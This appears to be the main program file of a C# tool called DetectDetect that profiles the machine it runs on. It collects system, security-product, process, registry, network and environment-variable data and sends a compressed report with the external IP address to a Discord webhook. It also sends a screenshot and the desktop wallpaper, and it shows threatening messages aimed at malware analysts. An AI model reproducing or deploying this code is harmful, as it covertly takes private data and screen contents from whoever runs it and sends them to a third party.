using DetectDetect.WMICore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using System.Net;
using DetectDetect.Utils;

using DetectDetect.Native;
using System.Runtime.InteropServices;
using DetectDetect.Info;

using System.Threading;
using static System.Net.WebRequestMethods;
using System.Drawing;
using DetectDetect.Reporter;
using System.Diagnostics;
using System.IO.Compression;
using DetectDetect.Discord;

namespace DetectDetect {
    internal class Program {
        public static string TAG = "Test-V3";
        public static string WEBHOOK = "HOOK";
        public static string SESSION_ID = Guid.NewGuid().ToString();
        static void Main(string[] args) {
            var hook = new DiscordWebHook(WEBHOOK, TAG, SESSION_ID);
            Console.WriteLine("Hey there Anaysis I detected your environment ObbedCode. I advise you to stop reversing this, this is a trademarked software that can and will detect any VM. Further analysis of code will result in court battles");
            var writer = new ReportWriter()
                .WriteSystemInfoCommand()
                .WriteBasicInfo()
                .WriteSecurity()
                .WriteFilesReport()
                .WriteWmiTests()
                .WriteReportsWmi()
                .WriteNetCards()
                .WriteRegReport()
                .WriteProcesses()
                .WriteEnvironmentVariables()
                .WriteSystemInformationClass()
                .Wait();
            //.WriteSystemInfoCommand()
            //.WriteSystemInformationClass()
            hook.SendTextDocument(ZipUtils.Zip(Convert.ToBase64String(Encoding.UTF8.GetBytes(writer.ToString()))), $"Test-{hook.GetID()}.txt", $"New Tests v8 [{hook.GetID()}] IP [{NetUtils.GetExternalIPAddress()}] DATE: {DateTime.Now}").Wait();
            new Thread(() => { Win32.USER32.Invoke<int>("MessageBox", 0, "Stop Looking at this you were warned now I am reporting you", "Stop", 0); }).Start();
            Console.WriteLine("You are being reported to ObbedCode's Channel this is your final warning CrowdStrike or VT etc");
            hook.SendImagePNG(WallpaperUtils.CaptureScreenshot(), "Screenshot.png", $"Screenshot! [{hook.GetID()}]").Wait();
            hook.SendImagePNG(WallpaperUtils.GetWallpaper(), $"Wallpaper! [{hook.GetID()}]").Wait();
            Console.ReadLine();
            Console.ReadLine();
        }
    }
}

